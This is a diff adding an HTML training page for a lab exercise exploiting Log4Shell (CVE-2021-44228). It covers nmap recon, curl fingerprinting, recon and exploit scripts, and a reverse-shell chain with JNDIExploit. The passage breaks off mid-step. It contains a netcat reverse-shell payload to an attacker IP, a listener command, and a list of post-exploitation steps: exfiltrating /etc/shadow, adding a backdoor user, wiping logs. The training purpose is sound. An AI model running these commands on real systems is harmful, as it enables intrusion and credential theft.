@@ -1,0 +1,1144 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>RT-Log4Shell Training Guide</title>
+  <style>
+    :root {
+      --bg: #08131f;
+      --bg-soft: #0f2233;
+      --panel: rgba(9, 25, 38, 0.88);
+      --panel-strong: rgba(12, 31, 47, 0.96);
+      --line: rgba(145, 197, 255, 0.18);
+      --text: #e9f3ff;
+      --muted: #9db7d3;
+      --accent: #7ef0c6;
+      --accent-strong: #35d3a1;
+      --warning: #ffd77a;
+      --danger: #ff7eb3;
+      --shadow: 0 28px 70px rgba(0, 0, 0, 0.35);
+      --radius: 24px;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: "Trebuchet MS", sans-serif;
+      background:
+        radial-gradient(circle at top left, rgba(65, 126, 255, 0.22), transparent 28%),
+        radial-gradient(circle at bottom right, rgba(126, 240, 198, 0.16), transparent 22%),
+        linear-gradient(135deg, #08131f 0%, #0b1826 54%, #102130 100%);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    .shell-bg {
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(126, 240, 198, 0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(126, 240, 198, 0.04) 1px, transparent 1px);
+      background-size: 42px 42px;
+      pointer-events: none;
+    }
+
+    .app-shell {
+      position: relative;
+      z-index: 1;
+      display: grid;
+      grid-template-columns: 340px minmax(0, 1fr);
+      gap: 24px;
+      padding: 28px;
+      min-height: 100vh;
+    }
+
+    .sidebar, .content-panel {
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--line);
+      box-shadow: var(--shadow);
+    }
+
+    .sidebar {
+      background: var(--panel);
+      border-radius: var(--radius);
+      padding: 28px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      position: sticky;
+      top: 28px;
+      height: calc(100vh - 56px);
+      overflow-y: auto;
+    }
+
+    .content-panel {
+      background: var(--panel-strong);
+      border-radius: var(--radius);
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .eyebrow {
+      margin: 0 0 8px;
+      color: var(--accent);
+      font-size: 0.82rem;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+    }
+
+    h1, h2, h3, strong { margin: 0; }
+    h1 { font-size: 2.2rem; line-height: 1; }
+    h2 { font-size: clamp(1.8rem, 3vw, 2.6rem); margin-bottom: 14px; }
+    h3 { font-size: 1.1rem; margin-bottom: 10px; color: var(--accent); }
+
+    p, li, label, input, select, textarea, button {
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    .lede, .progress-copy, .step-item p, .helper, .footer-meta p,
+    .task-card p, .info-card p, .muted { color: var(--muted); }
+
+    .step-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .step-item {
+      display: grid;
+      grid-template-columns: 44px 1fr;
+      gap: 12px;
+      padding: 12px;
+      border-radius: 16px;
+      border: 1px solid transparent;
+      background: rgba(255, 255, 255, 0.02);
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .step-item:hover { background: rgba(126, 240, 198, 0.04); }
+
+    .step-item.locked {
+      cursor: not-allowed;
+      opacity: 0.4;
+    }
+    .step-item.locked:hover { background: rgba(255,255,255,0.02); }
+
+    .step-item.active {
+      border-color: rgba(126, 240, 198, 0.4);
+      background: rgba(126, 240, 198, 0.08);
+    }
+
+    .step-item.complete .step-number {
+      background: var(--accent);
+      color: #05281d;
+    }
+
+    .step-number {
+      width: 44px;
+      height: 44px;
+      border-radius: 14px;
+      display: grid;
+      place-items: center;
+      font-family: "Consolas", monospace;
+      font-weight: bold;
+      background: rgba(145, 197, 255, 0.12);
+      color: var(--accent);
+      font-size: 0.85rem;
+    }
+
+    .step-item strong { font-size: 0.95rem; }
+    .step-item p { font-size: 0.82rem; margin: 2px 0 0; }
+
+    .progress-card { padding: 18px 20px; }
+    .progress-label {
+      margin: 0 0 10px;
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+    }
+
+    .progress-bar {
+      height: 8px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.06);
+      overflow: hidden;
+      margin-bottom: 8px;
+    }
+
+    #progress-fill {
+      display: block;
+      height: 100%;
+      width: 14%;
+      background: linear-gradient(90deg, var(--accent) 0%, #95f8db 100%);
+      border-radius: inherit;
+      transition: width 0.3s ease;
+    }
+
+    .progress-card, .info-card, .task-card, .checkpoint,
+    .mapping-card, .port-card, .summary-card, .phase-block {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--line);
+      border-radius: 20px;
+    }
+
+    .task-card, .checkpoint, .summary-card, .phase-block {
+      padding: 22px 24px;
+    }
+
+    .task-card { margin-top: 24px; }
+    .phase-block { margin-top: 20px; }
+
+    .phase-block h3 {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    .phase-badge {
+      display: inline-block;
+      padding: 3px 12px;
+      border-radius: 999px;
+      font-size: 0.75rem;
+      font-weight: bold;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .badge-term1 { background: rgba(126, 240, 198, 0.2); color: var(--accent); border: 1px solid rgba(126, 240, 198, 0.4); }
+    .badge-term2 { background: rgba(255, 215, 122, 0.2); color: var(--warning); border: 1px solid rgba(255, 215, 122, 0.4); }
+    .badge-term3 { background: rgba(255, 126, 179, 0.2); color: var(--danger); border: 1px solid rgba(255, 126, 179, 0.4); }
+    .badge-verify { background: rgba(145, 197, 255, 0.2); color: #91c5ff; border: 1px solid rgba(145, 197, 255, 0.4); }
+
+    .panel-step { display: none; }
+    .panel-step.active { display: block; }
+
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 18px;
+      margin-top: 24px;
+    }
+
+    .port-grid {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 16px;
+      margin-top: 20px;
+    }
+
+    .mapping-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 18px;
+      margin-top: 24px;
+    }
+
+    .info-card, .mapping-card, .port-card { padding: 18px; }
+
+    .checkpoint { margin-top: 22px; }
+
+    .flat-list { margin: 10px 0 0; padding-left: 22px; }
+    .flat-list li { margin-bottom: 8px; }
+
+    pre {
+      margin: 12px 0 0;
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: rgba(3, 10, 18, 0.95);
+      border-radius: 14px;
+      padding: 18px;
+      border: 1px solid rgba(126, 240, 198, 0.14);
+    }
+
+    code, pre {
+      font-family: "Consolas", "Courier New", monospace;
+      font-size: 0.9rem;
+      color: #b8f5e0;
+    }
+
+    .comment { color: #5a8a72; }
+
+    label {
+      display: block;
+      margin: 16px 0 6px;
+      color: var(--warning);
+      font-size: 0.95rem;
+      font-weight: 600;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      border: 1px solid rgba(145, 197, 255, 0.18);
+      background: rgba(7, 17, 27, 0.84);
+      color: var(--text);
+      border-radius: 14px;
+      padding: 14px 16px;
+      font-family: inherit;
+      font-size: 0.95rem;
+      transition: border-color 0.2s;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      outline: none;
+      border-color: rgba(126, 240, 198, 0.5);
+    }
+
+    textarea { resize: vertical; min-height: 120px; }
+    textarea.large { min-height: 180px; }
+    textarea.xlarge { min-height: 240px; }
+
+    .placeholder-hint {
+      font-size: 0.82rem;
+      color: var(--muted);
+      margin: 4px 0 0;
+      padding-left: 4px;
+      font-style: italic;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      cursor: pointer;
+      color: var(--text);
+    }
+
+    .checkbox-row input { width: auto; margin-top: 5px; }
+
+    .panel-footer {
+      margin-top: auto;
+      padding-top: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 18px;
+    }
+
+    button {
+      border: 0;
+      border-radius: 999px;
+      padding: 13px 28px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.18s ease, opacity 0.18s ease;
+      font-size: 1rem;
+    }
+
+    button:hover { transform: translateY(-1px); }
+    button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+    .primary {
+      background: linear-gradient(90deg, var(--accent-strong) 0%, var(--accent) 100%);
+      color: #06271d;
+    }
+
+    .secondary {
+      background: rgba(255, 255, 255, 0.08);
+      color: var(--text);
+      border: 1px solid rgba(255, 255, 255, 0.09);
+    }
+
+    .summary-card ul { margin: 0; padding-left: 20px; }
+    .summary-card li { margin-bottom: 10px; }
+
+    #validation-message {
+      padding: 10px 16px;
+      border-radius: 12px;
+      font-size: 0.9rem;
+      min-height: 40px;
+      display: flex;
+      align-items: center;
+    }
+
+    #validation-message.error {
+      background: rgba(107, 18, 18, 0.4);
+      border: 1px solid rgba(255, 116, 116, 0.4);
+      color: #ffd5d5;
+    }
+
+    #validation-message.success {
+      background: rgba(10, 60, 42, 0.4);
+      border: 1px solid rgba(126, 240, 198, 0.35);
+      color: #d9fff1;
+    }
+
+    .callout {
+      background: rgba(255, 215, 122, 0.08);
+      border: 1px solid rgba(255, 215, 122, 0.3);
+      border-radius: 14px;
+      padding: 14px 18px;
+      margin-top: 16px;
+      color: var(--warning);
+      font-size: 0.95rem;
+    }
+
+    .callout strong { color: var(--warning); }
+
+    .jump-banner {
+      display: none;
+      align-items: center;
+      gap: 12px;
+      background: rgba(126, 240, 198, 0.07);
+      border: 1px solid rgba(126, 240, 198, 0.25);
+      border-radius: 14px;
+      padding: 12px 18px;
+      margin-bottom: 24px;
+      font-size: 0.92rem;
+      color: var(--accent);
+    }
+
+    .jump-banner.visible { display: flex; }
+
+    .jump-btn {
+      margin-left: auto;
+      padding: 7px 18px;
+      font-size: 0.85rem;
+      border-radius: 999px;
+      background: rgba(126, 240, 198, 0.15);
+      border: 1px solid rgba(126, 240, 198, 0.4);
+      color: var(--accent);
+      cursor: pointer;
+      font-weight: 700;
+      white-space: nowrap;
+      transform: none;
+    }
+
+    .jump-btn:hover { background: rgba(126, 240, 198, 0.25); transform: none; }
+
+    @media (max-width: 1200px) {
+      .app-shell { grid-template-columns: 1fr; }
+      .sidebar { position: static; height: auto; }
+      .info-grid, .mapping-grid { grid-template-columns: 1fr; }
+      .port-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+
+    @media (max-width: 720px) {
+      .app-shell { padding: 16px; }
+      .sidebar, .content-panel { padding: 20px; }
+      .port-grid { grid-template-columns: 1fr; }
+      .panel-footer { flex-direction: column; align-items: stretch; }
+      .panel-footer button { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="shell-bg"></div>
+  <main class="app-shell">
+    <aside class="sidebar">
+      <div class="brand-block">
+        <p class="eyebrow">Attacker Training Module</p>
+        <h1>RT-Log4Shell</h1>
+        <p class="lede">
+          A guided walkthrough for reconnaissance, application mapping, Log4Shell canary validation, and hands-on reverse shell exploitation inside your isolated lab environment.
+        </p>
+      </div>
+
+      <ol class="step-list" id="step-list">
+        <li class="step-item active" data-step="0">
+          <span class="step-number">01</span>
+          <div><strong>Welcome</strong><p>Set the scenario and attacker mindset.</p></div>
+        </li>
+        <li class="step-item locked" data-step="1">
+          <span class="step-number">02</span>
+          <div><strong>Reconnaissance</strong><p>Discover all open ports on the target VM.</p></div>
+        </li>
+        <li class="step-item locked" data-step="2">
+          <span class="step-number">03</span>
+          <div><strong>Application Mapping</strong><p>Infer routes and input shapes from live responses.</p></div>
+        </li>
+        <li class="step-item locked" data-step="3">
+          <span class="step-number">04</span>
+          <div><strong>Log4j Probing</strong><p>Convert discoveries into a targeted canary plan.</p></div>
+        </li>
+        <li class="step-item locked" data-step="4">
+          <span class="step-number">05</span>
+          <div><strong>Recon Script</strong><p>Confirm vulnerable services via LDAP callback.</p></div>
+        </li>
+        <li class="step-item locked" data-step="5">
+          <span class="step-number">06</span>
+          <div><strong>Exploit Script</strong><p>Run the guided RCE attack chain.</p></div>
+        </li>
+        <li class="step-item locked" data-step="6">
+          <span class="step-number">07</span>
+          <div><strong>Manual Reverse Shell</strong><p>Step-by-step shell on the 8080 service.</p></div>
+        </li>
+        <li class="step-item locked" data-step="7">
+          <span class="step-number">08</span>
+          <div><strong>Debrief</strong><p>Reflect on findings and SBOM implications.</p></div>
+        </li>
+      </ol>
+
+      <div class="progress-card">
+        <p class="progress-label">Progress</p>
+        <div class="progress-bar"><span id="progress-fill"></span></div>
+        <p class="progress-copy" id="progress-copy">Step 1 of 8</p>
+      </div>
+    </aside>
+
+    <section class="content-panel">
+
+      <!-- STEP 0: WELCOME -->
+      <section class="panel-step active" data-step="0">
+        <div class="jump-banner" id="jump-0"></div>
+        <p class="eyebrow">Step 1</p>
+        <h2>Welcome To The Exercise</h2>
+        <p>
+          This module simulates the attacker side of a newly disclosed software vulnerability — CVE-2021-44228, known as Log4Shell. You are operating inside an isolated classroom lab environment. Your goal is to move through a realistic attack chain: from passive port discovery, through application fingerprinting, to full remote code execution and an interactive reverse shell.
+        </p>
+        <p style="margin-top:12px;">
+          This is not a click-through quiz. Every step requires you to run real commands against real services. The UI guides you through what to think about, but the work happens in your terminal.
+        </p>
+
+        <div class="info-grid">
+          <article class="info-card">
+            <h3>What is Log4Shell?</h3>
+            <p>CVE-2021-44228 is a critical remote code execution vulnerability in Apache Log4j 2, versions 2.0-beta9 through 2.14.1. When a vulnerable application logs attacker-controlled input, Log4j processes embedded JNDI lookup strings — triggering outbound network requests that can be redirected to load and execute arbitrary Java code on the target server.</p>
+          </article>
+          <article class="info-card">
+            <h3>Why it matters for SBOMs</h3>
+            <p>Log4Shell became the defining argument for Software Bill of Materials (SBOM) adoption. An SBOM would have listed Log4j 2.14.1 as a transitive dependency before the vulnerability was announced — giving defenders time to patch before attackers could exploit it. In this lab, you will find that jar on disk yourself after achieving RCE.</p>
+          </article>
+          <article class="info-card">
+            <h3>Lab services overview</h3>
+            <p>The target VM runs four services. Two are custom Spring Boot applications using vulnerable Log4j. One is a Python Flask service with no Log4j dependency. One is a reference vulnerable app from the security community. Your job is to identify which is which — without being told in advance.</p>
+          </article>
+        </div>
+
+        <div class="task-card">
+          <h3>What you will accomplish</h3>
+          <ol class="flat-list">
+            <li>Run an nmap scan to discover open ports on the target VM.</li>
+            <li>Use curl to manually fingerprint each service — routes, methods, input shapes, and framework hints.</li>
+            <li>Run the recon script to confirm which services trigger a Log4Shell LDAP callback.</li>
+            <li>Run the exploit script to demonstrate the RCE attack chain against a confirmed vulnerable service.</li>
+            <li>Perform a manual three-terminal reverse shell attack against the port 8080 reference app.</li>
+            <li>Read flags from inside the container to prove code execution.</li>
+            <li>Locate the Log4j jar on disk — the SBOM artifact that would have prevented all of this.</li>
+          </ol>
+        </div>
+
+        <div class="task-card" style="margin-top:20px;">
+          <label for="operator-name">Operator callsign (optional)</label>
+          <input id="operator-name" type="text" placeholder="Enter your name or callsign for the session summary">
+        </div>
+      </section>
+
+      <!-- STEP 1: RECON -->
+      <section class="panel-step" data-step="1">
+        <div class="jump-banner" id="jump-1"></div>
+        <p class="eyebrow">Step 2</p>
+        <h2>Reconnaissance</h2>
+        <p>
+          Your first task is pure reconnaissance — discover what is listening on the target VM. Run an nmap scan and record every open application port you find. There are four. Do not assume you already know what they are.
+        </p>
+
+        <div class="task-card">
+          <h3>Run the nmap scan</h3>
+          <pre><code><span class="comment"># Option 1: use the provided script</span>
+python3 tools/recon/nmap_scan.py
+
+<span class="comment"># Option 2: run nmap directly</span>
+nmap -sV -p- --open &lt;TARGET_IP&gt;
+
+<span class="comment"># Option 3: faster scan of likely high ports</span>
+nmap -sV -p 8000-9000 --open &lt;TARGET_IP&gt;</code></pre>
+        </div>
+
+        <div class="task-card">
+          <h3>Record all four open ports you discovered</h3>
+          <p>Enter each port number exactly as nmap reported it. All four must be present to continue.</p>
+          <div class="port-grid">
+            <article class="port-card">
+              <label for="port-1">Open port 1</label>
+              <input id="port-1" type="number" min="1" max="65535" placeholder="Port number">
+            </article>
+            <article class="port-card">
+              <label for="port-2">Open port 2</label>
+              <input id="port-2" type="number" min="1" max="65535" placeholder="Port number">
+            </article>
+            <article class="port-card">
+              <label for="port-3">Open port 3</label>
+              <input id="port-3" type="number" min="1" max="65535" placeholder="Port number">
+            </article>
+            <article class="port-card">
+              <label for="port-4">Open port 4</label>
+              <input id="port-4" type="number" min="1" max="65535" placeholder="Port number">
+            </article>
+          </div>
+        </div>
+
+        <div class="callout">
+          <strong>Note:</strong> One of the four ports belongs to a standalone reference application used for manual exploitation later in the exercise. Record it here — you will not probe it in the next few steps. That comes at the end.
+        </div>
+      </section>
+
+      <!-- STEP 2: APPLICATION MAPPING -->
+      <section class="panel-step" data-step="2">
+        <div class="jump-banner" id="jump-2"></div>
+        <p class="eyebrow">Step 3</p>
+        <h2>Application Mapping</h2>
+        <p>
+          Your nmap scan should have revealed four open ports: <strong>8001, 8002, 8003, and 8080</strong>. In this step you will manually probe the first three to understand what they do, what routes they expose, and whether they look like Java applications. Leave 8080 alone for now — that is the manual exploitation target at the end of the exercise.
+        </p>
+        <p style="margin-top:10px;">Here is what you are working with on ports 8001–8003:</p>
+        <ul class="flat-list" style="margin-top:8px;">
+          <li><strong>Port 8001</strong> — an authentication service. It handles user login.</li>
+          <li><strong>Port 8002</strong> — an inventory search service. It accepts search queries and returns results.</li>
+          <li><strong>Port 8003</strong> — a status service. It is your negative control for this exercise.</li>
+        </ul>
+        <p style="margin-top:10px; color:var(--muted);">Your job is to probe each one with curl, confirm what routes they expose, and determine whether each looks like a Log4j-capable target.</p>
+
+        <div class="task-card">
+          <h3>Manual discovery commands</h3>
+          <pre><code><span class="comment"># Auth service — port 8001</span>
+curl -i http://&lt;TARGET&gt;:8001/
+curl -i http://&lt;TARGET&gt;:8001/health
+curl -i http://&lt;TARGET&gt;:8001/login
+curl -i -X POST http://&lt;TARGET&gt;:8001/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","password":"test"}'
+
+<span class="comment"># Inventory service — port 8002</span>
+curl -i http://&lt;TARGET&gt;:8002/
+curl -i http://&lt;TARGET&gt;:8002/health
+curl -i http://&lt;TARGET&gt;:8002/search
+curl -i "http://&lt;TARGET&gt;:8002/search?q=test"
+
+<span class="comment"># Status service — port 8003</span>
+curl -i http://&lt;TARGET&gt;:8003/
+curl -i http://&lt;TARGET&gt;:8003/health
+curl -i http://&lt;TARGET&gt;:8003/search
+curl -i "http://&lt;TARGET&gt;:8003/search?q=test"</code></pre>
+        </div>
+
+        <div class="mapping-grid">
+          <article class="mapping-card">
+            <h3>Auth service — 8001</h3>
+            <p style="color:var(--muted);font-size:0.9rem;">This is a login service. Try the /login route and look at what it accepts and returns.</p>
+            <label for="svc1-path">Which route accepted your login attempt?</label>
+            <input id="svc1-path" type="text" placeholder="/login">
+            <p class="placeholder-hint">The path after the port number — e.g. /login</p>
+          </article>
+
+          <article class="mapping-card">
+            <h3>Inventory service — 8002</h3>
+            <p style="color:var(--muted);font-size:0.9rem;">This is a search service. Try the /search route with a query parameter and observe what it returns.</p>
+            <label for="svc2-path">Which route returned search results?</label>
+            <input id="svc2-path" type="text" placeholder="/search">
+            <p class="placeholder-hint">The path after the port number — e.g. /search</p>
+          </article>
+
+          <article class="mapping-card">
+            <h3>Status service — 8003</h3>
+            <p style="color:var(--muted);font-size:0.9rem;">This is your negative control. Look carefully at the HTTP response headers — they will tell you what framework this service is built on.</p>
+            <label for="svc3-assessment">Does this service look like a Log4j target?</label>
+            <select id="svc3-assessment">
+              <option value="">Choose one</option>
+              <option>Yes</option>
+              <option>No</option>
+            </select>
+            <label for="svc3-notes">Explain what you observed that led to your answer.</label>
+            <textarea id="svc3-notes" class="large" placeholder="Example: The Server header in the curl response showed Werkzeug/Python, which indicates a Python Flask application. Log4j is a Java-only library. A Python application cannot use Log4j, so this service cannot be vulnerable to Log4Shell regardless of what input it accepts."></textarea>
+          </article>
+        </div>
+      </section>
+
+      <!-- STEP 3: LOG4J PROBING PLAN -->
+      <section class="panel-step" data-step="3">
+        <div class="jump-banner" id="jump-3"></div>
+        <p class="eyebrow">Step 4</p>
+        <h2>Log4j Probing Plan</h2>
+        <p>
+          You now have a map of the services. Before running the automated recon script, build the mental model the script is about to confirm. Understanding <em>why</em> you are targeting specific routes and fields is what separates a trained operator from someone blindly running tools.
+        </p>
+
+        <div class="task-card">
+          <h3>The Log4Shell trigger condition</h3>
+          <p>For Log4Shell to fire, three things must be true simultaneously:</p>
+          <ol class="flat-list">
+            <li>The application must use a vulnerable version of Log4j (2.0-beta9 through 2.14.1).</li>
+            <li>The application must log attacker-controlled input using Log4j — for example, <code>logger.info("Login attempt: {}", username)</code>.</li>
+            <li>The Log4j instance must not have JNDI lookups disabled — the default before the patch.</li>
+          </ol>
+          <p style="margin-top:12px;">Your job is to identify which input fields are likely being passed to a Log4j logger. Fields that get logged are typically things like usernames, search queries, email addresses — anything that helps operators audit user activity.</p>
+        </div>
+
+        <div class="task-card">
+          <h3>Manual validation commands</h3>
+          <pre><code><span class="comment"># Confirm 8001 accepts a POST login with JSON username field</span>
+curl -i -X POST http://&lt;TARGET&gt;:8001/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser","password":"testpass"}'
+
+<span class="comment"># Confirm 8002 returns results for a search query parameter</span>
+curl -i "http://&lt;TARGET&gt;:8002/search?q=F-35"
+
+<span class="comment"># Confirm 8003 responds but is Python-based (negative control)</span>
+curl -i "http://&lt;TARGET&gt;:8003/search?q=test"</code></pre>
+        </div>
+
+        <div class="task-card">
+          <h3>Why 8003 is the negative control</h3>
+          <p>Service 3 accepts user input and has a search endpoint. A less careful operator might include it in the canary sweep. The correct reasoning is simpler: the service is written in Python. Log4j is a Java library. A Python application cannot be vulnerable to Log4Shell regardless of what input it accepts. The Server header in the HTTP response makes this clear.</p>
+        </div>
+
+        <div class="task-card">
+          <h3>Operator notes</h3>
+          <label for="probe-notes">Record your observations and reasoning before running the script.</label>
+          <textarea id="probe-notes" class="xlarge" placeholder="Example: Service on 8001 is a Spring Boot login service. The POST /login endpoint accepts a JSON body with a username field. Login attempts are almost always logged for audit purposes — this is a likely Log4Shell injection point via the username field.
+
+Service on 8002 is a Spring Boot inventory search service. The GET /search endpoint accepts a query parameter named q. Search queries are commonly logged for analytics. The q parameter is the injection point.
+
+Service on 8003 shows a Werkzeug/Python Server header. This is a Flask app. Log4j is Java-only. Excluded from the canary sweep."></textarea>
+          <p class="placeholder-hint">Be specific — reference field names, routes, and your reasoning for each service.</p>
+        </div>
+      </section>
+
+      <!-- STEP 4: RECON SCRIPT -->
+      <section class="panel-step" data-step="4">
+        <div class="jump-banner" id="jump-4"></div>
+        <p class="eyebrow">Step 5</p>
+        <h2>Recon Script — LDAP Callback Confirmation</h2>
+        <p>
+          The recon script automates what you just planned manually. It fingerprints each service, starts a marshalsec LDAP server, sends JNDI canary payloads to the likely injection points, and reports which services trigger a callback. A callback confirms Log4j is present, vulnerable, and logging the injected field.
+        </p>
+
+        <div class="task-card">
+          <h3>What the script does under the hood</h3>
+          <ol class="flat-list">
+            <li><strong>Phase 1 — Fingerprinting:</strong> Checks headers and response bodies for Java/Spring Boot indicators.</li>
+            <li><strong>Phase 2 — Marshalsec:</strong> Starts a local LDAP redirect server to receive callbacks.</li>
+            <li><strong>Phase 3 — Canary payloads:</strong> Sends a JNDI payload to the most likely logged input on each service. A vulnerable service makes an outbound LDAP connection back to marshalsec.</li>
+          </ol>
+        </div>
+
+        <div class="task-card">
+          <h3>Run the script</h3>
+          <pre><code><span class="comment"># From inside the attacker container</span>
+python3 tools/exploit/log4shell_recon.py --scan
+
+<span class="comment"># Or using make</span>
+make recon</code></pre>
+          <p style="margin-top:12px;">When prompted, enter your target IP, your Kali IP, and ports <strong>8001, 8002, and 8003</strong>. Do not include 8080 — that service uses a different injection point (an HTTP header) that the script does not probe automatically.</p>
+        </div>
+
+        <div class="task-card">
+          <h3>Expected results</h3>
+          <ul class="flat-list">
+            <li><strong>8001:</strong> VULNERABLE — LDAP callback confirmed via POST /login username field.</li>
+            <li><strong>8002:</strong> VULNERABLE — LDAP callback confirmed via GET /search q parameter.</li>
+            <li><strong>8003:</strong> SAFE — No callback. Python service, no Log4j.</li>
+          </ul>
+        </div>
+
+        <div class="task-card">
+          <label for="recon-output">Paste the recon script output here.</label>
+          <textarea id="recon-output" class="xlarge" placeholder="Paste the terminal output from log4shell_recon.py. The RECON RESULTS section at the bottom showing VULNERABLE / SAFE results is the most important part."></textarea>
+          <p class="placeholder-hint">Look for the RECON RESULTS section at the bottom of the script output.</p>
+        </div>
+
+        <div class="checkpoint">
+          <label class="checkbox-row" for="confirmed-log4j">
+            <input id="confirmed-log4j" type="checkbox">
+            <span>I have confirmed that services on 8001 and 8002 are vulnerable via LDAP callback, and the service on 8003 is not.</span>
+          </label>
+        </div>
+      </section>
+
+      <!-- STEP 5: EXPLOIT SCRIPT -->
+      <section class="panel-step" data-step="5">
+        <div class="jump-banner" id="jump-5"></div>
+        <p class="eyebrow">Step 6</p>
+        <h2>Exploit Script — RCE Attack Chain</h2>
+        <p>
+          With vulnerable services confirmed, the exploit script demonstrates what an attacker would do next — a realistic post-exploitation chain sent as JNDI payloads against a confirmed vulnerable service.
+        </p>
+
+        <div class="task-card">
+          <h3>What the exploit script demonstrates</h3>
+          <ul class="flat-list">
+            <li>Reading flag files to prove code execution.</li>
+            <li>Exfiltrating <code>/etc/shadow</code> and <code>/etc/passwd</code> for offline credential cracking.</li>
+            <li>Locating the Log4j jar on disk — the SBOM artifact.</li>
+            <li>Hunting for SSH private keys for lateral movement.</li>
+            <li>Checking sudo privileges and SUID binaries for privilege escalation.</li>
+            <li>Adding a backdoor user for persistence.</li>
+            <li>Wiping logs for anti-forensics.</li>
+          </ul>
+        </div>
+
+        <div class="task-card">
+          <h3>Run the exploit script</h3>
+          <pre><code><span class="comment"># From inside the attacker container</span>
+python3 tools/exploit/log4shell_exploit.py
+
+<span class="comment"># Or using make</span>
+make exploit PORT=8001</code></pre>
+          <p style="margin-top:12px;">When prompted, enter the target IP, your Kali IP, and select port 8001 as the target.</p>
+        </div>
+
+        <div class="task-card">
+          <label for="exploit-notes">What did you observe in the exploit script output?</label>
+          <textarea id="exploit-notes" class="large" placeholder="Example: The script sent 14 payloads to the auth-service on port 8001. Marshalsec started on port 1389. Each payload was confirmed SENT. The loot file was saved to /app/loot/. The impact summary listed flags read, /etc/shadow stolen, SSH keys hunted, backdoor user added, logs wiped, and service killed."></textarea>
+          <p class="placeholder-hint">Describe what the output showed. Note which payloads were sent and what the impact summary said.</p>
+        </div>
+      </section>
+
+      <!-- STEP 6: MANUAL REVERSE SHELL -->
+      <section class="panel-step" data-step="6">
+        <div class="jump-banner" id="jump-6"></div>
+        <p class="eyebrow">Step 7</p>
+        <h2>Manual Reverse Shell — Port 8080</h2>
+        <p>
+          This is the hands-on capstone of the exercise. You will manually exploit the reference vulnerable application on port 8080 to obtain an interactive shell inside the target container. Every command here is typed by you. This is what real exploitation looks like.
+        </p>
+
+        <div class="callout">
+          <strong>Why 8080 is different:</strong> The service on port 8080 does not have a login route or a search query parameter. Its injection point is an HTTP request header — <code>X-Api-Version</code>. This is a common API pattern and demonstrates that Log4Shell can fire from any logged input, not just form fields.
+        </div>
+
+        <div class="task-card">
+          <h3>The three-terminal attack chain</h3>
+          <ul class="flat-list">
+            <li><strong>Terminal 1 — JNDIExploit:</strong> Acts as both the LDAP server (receives the JNDI lookup) and the HTTP server (serves the malicious Java class). Runs inside the attacker container.</li>
+            <li><strong>Terminal 2 — netcat listener:</strong> Waits for the reverse shell connection from the target container. Runs on your Kali host directly — not inside the container.</li>
+            <li><strong>Terminal 3 — curl trigger:</strong> Sends the HTTP request with the JNDI payload in the header. Runs on your Kali host.</li>
+          </ul>
+        </div>
+
+        <div class="phase-block">
+          <h3><span class="phase-badge badge-term1">Terminal 1</span> Start JNDIExploit inside the attacker container</h3>
+          <p>Open a new terminal on your Kali machine and run:</p>
+          <pre><code>docker exec -it attacker java -jar /tools/jndi/JNDIExploit-1.2-SNAPSHOT.jar -i &lt;KALI_IP&gt; -p 8888</code></pre>
+          <p style="margin-top:12px;">Replace <code>&lt;KALI_IP&gt;</code> with your Kali machine's IP address. Wait until you see both lines before moving on:</p>
+          <pre><code>[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...</code></pre>
+          <p style="margin-top:8px; color:var(--muted);">Leave this terminal running. As the exploit fires you will see <code>[+] Received LDAP Query</code>, <code>[+] Send LDAP reference result</code>, and critically <code>[+] Receive ClassRequest</code> when the target JVM fetches and executes the malicious class.</p>
+        </div>
+
+        <div class="phase-block">
+          <h3><span class="phase-badge badge-term2">Terminal 2</span> Start your netcat listener on Kali host</h3>
+          <p>Open a second terminal on your Kali machine. This is where the reverse shell will appear:</p>
+          <pre><code>nc -lvnp 4444</code></pre>
+          <p style="margin-top:12px; color:var(--muted);">This runs on your <strong>Kali host directly</strong>, not inside the container. The reverse shell from the target container will connect back to your Kali IP on port 4444. Leave it running silently and watch it.</p>
+        </div>
+
+        <div class="phase-block">
+          <h3><span class="phase-badge badge-term3">Terminal 3</span> Generate the payload and fire</h3>
+          <p>Open a third terminal on your Kali machine. First, generate your base64-encoded reverse shell payload:</p>
+          <pre><code><span class="comment"># Generate the netcat reverse shell payload — encode as base64</span>
+echo "nc &lt;KALI_IP&gt; 4444 -e /bin/sh" | base64 -w 0</code></pre>
